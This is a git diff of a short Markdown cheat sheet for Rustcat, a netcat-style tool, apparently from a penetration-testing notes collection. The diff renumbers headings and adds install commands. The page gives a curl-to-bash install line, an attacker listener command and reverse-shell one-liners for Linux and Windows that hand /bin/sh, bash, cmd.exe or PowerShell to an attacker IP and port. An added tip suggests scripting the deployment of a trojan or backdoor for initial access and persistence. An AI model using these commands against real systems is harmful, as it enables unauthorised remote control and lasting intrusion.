@@ -1,24 +1,29 @@
 # Rustcat
 
-## Setup
+## 01 - Setup
 
-### Server
+### 1.1 - Server
 
 Install it according to your distribution.
 
 ```
 $ bash <(curl -s https://raw.githubusercontent.com/robiot/rustcat/master/pkg/debian-install.sh)
+
+$ yay -S rustcat
+
+$ emerge net-analyzer/rustcat
 ```
 
-```
-$ yay -S rustcat
-```
+Universal installation.
 
 ```
 $ cargo install rustcat
 ```
 
-### Implant
+### 1.2 - Implant
+
+> [!TIP]
+> You can make an automated script to deploy a trojan horse or backdoor during the initial access and maintaining access.
 
 ```
 https://github.com/robiot/rustcat/releases/download/v3.0.0/rcat-v3.0.0-linux-x86_64
@@ -34,7 +39,7 @@ https://github.com/robiot/rustcat/releases/download/v3.0.0/rcat-v3.0.0-darwin-aa
 https://github.com/robiot/rustcat/releases/download/v3.0.0/rcat-v3.0.0-darwin-x86_64
 ```
 
-## Usage
+## 02 - Usage
 
 Launch a listener on the attacker's machine in all addresses (`0.0.0.0`) with command history and command completion and `SIGINT` (`Ctrl + C`) blocking.
 
@@ -44,7 +49,7 @@ Launch a listener on the attacker's machine in all addresses (`0.0.0.0`) with co
 > rcat l -ib <attacker_PORT>
 ```
 
-### Reverse Shell
+### 2.1 - Reverse Shell
 
 ```
 $ ./rcat c -s </bin/sh | /bin/bash> <attacker_IP> <attacker_PORT>
@@ -57,4 +62,6 @@ C:\> .\rcat.exe c -s <cmd.exe | powershell.exe> <attacker_IP> <attacker_PORT>
 ---
 ## References
 
-### Github
+### Source Repositories
+
+- [robiot: `rustcat`](https://github.com/robiot/rustcat)
